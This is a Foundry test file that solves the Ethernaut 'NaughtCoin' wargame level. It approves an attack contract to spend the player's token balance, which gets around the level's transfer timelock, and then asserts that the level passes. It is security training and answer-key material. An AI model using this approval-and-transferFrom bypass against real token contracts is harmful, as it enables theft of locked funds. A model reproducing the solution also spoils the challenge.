pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/15-NaughtCoin/NaughtCoinFactory.sol";

contract NaughtCoinTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1); // generate random-looking address with given private key

    function setUp() public {
        ethernaut = new Ethernaut();

        // set hacker's balance to 1 Ether, use it when you need!
        vm.deal(hacker, 1 ether);
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));
        NaughtCoinAttack naughtCoinAttack = new NaughtCoinAttack(
            ethernautNaughtCoin
        );

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        ethernautNaughtCoin.approve(
            address(naughtCoinAttack),
            ethernautNaughtCoin.balanceOf(hacker)
        );
        naughtCoinAttack.attack();
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
